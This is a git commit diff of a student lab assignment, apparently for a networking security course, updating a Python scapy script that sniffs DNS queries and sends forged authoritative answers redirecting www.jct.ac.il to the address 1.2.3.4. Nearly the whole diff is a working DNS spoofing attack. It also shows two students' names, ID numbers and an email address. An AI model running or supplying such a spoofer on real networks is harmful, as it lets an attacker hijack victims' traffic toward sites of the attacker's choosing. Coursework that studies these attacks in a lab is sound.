f4fe01683d3868a4fb75c103fbad024b52dc0fbf
Yedidia Bakuradze <yedidiadev@gmail.com>
2025-12-29 01:58:14 +0200

    final version

--- Labs/Lab 5/main.py
+++ Labs/Lab 5/main.py
@@ -1,34 +1,40 @@
-from scapy.all import IP, UDP, DNS, DNSQR, sniff,DNSRR,send
+# Yedidia Bakuradze - 332461854
+# Meir Crombie - 214736688
 
-dummy_ans = "1.2.3.4"
-tar = "jct.ac.il"
+from scapy.all import IP, UDP, DNS, DNSQR, sniff,DNSRR,send,conf
+
+my_ip = conf.iface.ip
+fake = "1.2.3.4"
+target = "www.jct.ac.il."
 def attack(pkt):
+    # if not a dns packet
     if not pkt.haslayer(DNS): return
 
-    # Ignore if a responce
+    # if not a request or its mine
+    if pkt[DNS].qr == 1: return
+    if pkt[IP].src == my_ip: return
 
-    print(f"DNS Received Query: {pkt.summary()}")
-    print("Redirecting to fake NS: => 1.2.3.4")
-    
-    query_name = pkt[DNSQR].qname.decode()
-    client_ip = pkt[IP].src
-    client_port = pkt[UDP].sport
+    # if is not jct
+    qname = pkt[DNSQR].qname.decode()
+    if target not in qname: 
+        print(f"Skipping {target}/{qname}")
+        return
 
-    dns_reply = (
-        IP(dst=client_ip, src=pkt[IP].dst) /
-        UDP(dport=client_port, sport=53) /
+    res = (
+        IP(dst=pkt[IP].src, src=pkt[IP].dst) /
+        UDP(dport=pkt[UDP].sport, sport=53) /
         DNS(
             id=pkt[DNS].id,
             qr=1,           
             aa=1,           
             qd=pkt[DNS].qd, 
-            an=DNSRR(rrname=query_name, ttl=300, rdata=dummy_ans)
+            an=DNSRR(rrname=qname, ttl=300, rdata=fake)
         )
     )
-    send(dns_reply, iface="eth0", verbose=0)
+    send(res, verbose=0)
 
 def main():
-    print("DNS Cache Poisning ===>")
+    print("Starting DNS Poisning ===>")
     sniff(iface="eth0", filter='udp port 53', prn=attack)
 
 main()
